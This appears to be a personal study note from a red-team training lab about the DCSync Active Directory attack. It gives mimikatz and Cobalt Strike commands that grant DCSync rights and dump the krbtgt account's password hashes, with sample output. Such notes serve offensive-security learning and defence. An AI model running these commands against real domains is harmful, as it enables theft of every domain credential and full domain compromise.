---
creation date: September 26th 2022
last modified date: September 26th 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[DCSync]]  
___

## Description:  

DCSync is a technique which replicates the MS-DRSR protocol to replicate AD information, including password hashes. Under normal circumstances, this is only ever performed by (and between) Domain Controllers.

### With mimikatz
`/user` allows you to specify which user instead of doing all account on the domain.
```
mimikatz # lsadump::dcsync /user:Administrator
```

### In CobaltStrike
`Add-DomainObjectAcl` from PowerView can be used to add a new ACL to a domain object. If we have access to a domain admin account, we can grant dcsync rights to any principal in the domain (a user, group or even computer).

```
beacon> getuid
[*] You are DEV\nlamb

beacon> powershell Add-DomainObjectAcl -TargetIdentity "DC=dev,DC=cyberbotic,DC=io" -PrincipalIdentity bfarmer -Rights DCSync
```

Now do a DCsysnc through cobalt strike
```
beacon> getuid
[*] You are DEV\bfarmer

beacon> dcsync dev.cyberbotic.io DEV\krbtgt
[DC] 'dev.cyberbotic.io' will be the domain
[DC] 'dc-2.dev.cyberbotic.io' will be the DC server
[DC] 'DEV\krbtgt' will be the user account

[...snip...]

* Primary:Kerberos-Newer-Keys *
    Default Salt : DEV.CYBERBOTIC.IOkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa
      aes128_hmac       (4096) : 473a92cc46d09d3f9984157f7dbc7822
      des_cbc_md5       (4096) : b9fefed6da865732
```



___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: September 26th 2022 (12:11 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
